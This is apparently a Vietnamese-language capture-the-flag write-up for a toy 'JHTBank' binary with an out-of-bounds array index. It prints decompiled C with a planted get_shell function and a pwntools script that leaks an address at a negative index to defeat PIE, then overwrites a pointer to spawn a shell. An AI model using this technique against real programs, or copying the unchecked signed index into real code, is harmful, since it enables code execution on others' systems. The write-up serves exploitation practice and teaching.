# Decription

Lỗi Out-of-Bounds xảy ra khi chương trình truy xuất dữ liệu bên ngoài phạm vi hợp lệ của bộ nhớ được cấp phát, thường là mảng hoặc buffer. Điều này có thể gây ra:

    Sập chương trình (crash)

    Ghi đè dữ liệu khác trong bộ nhớ

    Lộ thông tin nhạy cảm

    Thực thi mã độc (trong một số trường hợp nghiêm trọng)

Nguyên nhân thường là do:

    Không kiểm tra giới hạn (bounds checking)

    Gán sai kích thước buffer

    Sử dụng sai số lượng byte đọc/ghi
    
# Code

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // ebx
  int v4; // [rsp+0h] [rbp-20h] BYREF
  int v5; // [rsp+4h] [rbp-1Ch] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("------ JHTBank ------");
  while ( 1 )
  {
    main_menu();
    __isoc99_scanf("%d", &v5);
    if ( v5 != 1 )
      break;
    printf("Index: ");
    __isoc99_scanf("%d", &v4);
    if ( v4 <= 9 )
    {
      account_menu();
      __isoc99_scanf("%d", &v5);
      if ( v5 == 4 || v5 == 3 || v5 == 2 )
      {
        if ( *((_QWORD *)&acc + 2 * v4) )
        {
          if ( v5 == 4 )
          {
            printf("Name: %s\n", *((const char **)&acc + 2 * v4));
            printf("Amount: %lu\n", qword_3608[2 * v4]);
          }
          else if ( v5 == 2 )
          {
            printf("Enter name: ");
            __isoc99_scanf("%80s", *((_QWORD *)&acc + 2 * v4));
          }
          else
          {
            printf("Enter amount: ");
            __isoc99_scanf("%lu", (char *)&acc + 16 * v4 + 8);
          }
        }
        else
        {
          puts("You didn't create this account!");
        }
      }
      else if ( v5 == 1 )
      {
        v3 = v4;
        *((_QWORD *)&acc + 2 * v3) = malloc(0x50uLL);
        printf("New name: ");
        __isoc99_scanf("%80s", *((_QWORD *)&acc + 2 * v4));
        printf("New amount: ");
        __isoc99_scanf("%lu", (char *)&acc + 16 * v4 + 8);
      }
      else
      {
        puts("Invalid choice!");
      }
    }
    else
    {
      puts("You can have maximum 10 accounts");
    }
  }
  exit(0);
}
int get_shell()
{
  return system("/bin/sh");
}

int account_menu()
{
  puts("1. Create new account");
  puts("2. Change name");
  puts("3. Change money");
  puts("4. Show info");
  return printf("> ");
}

int main_menu()
{
  puts("1. Select an account");
  puts("2. Exit");
  return printf("> ");
}

void init()
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
}
```
Create By JHT HUU TRI


# Problem

Ta thấy rằng mặc dù  __isoc99_scanf("%lu", (char *)&acc + 16 * v4 + 8); là nhập vào số nguyên dương nhưng khi khai 

báo biến không chỉ định là dương hay âm nên ta có thể lợi dụng nó để vượt lên trên ra ngoài phạm vi của ìdx, leak các giá trị nhạy cảm.

# Solve

Ta thấy có hàm get_shell

Trong gdb, tại index -5 ta có địa chỉ của 1 hàm binary, leak nó ra và tính được địa chỉ base của binary ( DO pie hoạt động nên không thể trực tiếp nhảy vào shell)

Sau đó ta overwrite địa chỉ nào đó sẽ thực = get_shell (index -9)


```c
#!/usr/bin/python3

from pwn import *

context.binary = exe =ELF('./oob',checksec=False)

p=process(exe.path)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Index: ', b'-5')
p.sendlineafter(b'> ', b'4')
p.recvuntil(b'Name: ')
exe_leak = u64(p.recvline()[:-1] + b'\x00\x00')
exe.address = exe_leak - 13744
log.info("Exe lEak: " + hex(exe_leak))
log.info("Exe Base: " + hex(exe.address))


p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Index: ', b'-9')
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'amount: ', str(exe.sym.get_shell).encode())
p.sendlineafter(b'> ', b'2')
p.sendline(b'ls -al')


p.interactive()

```
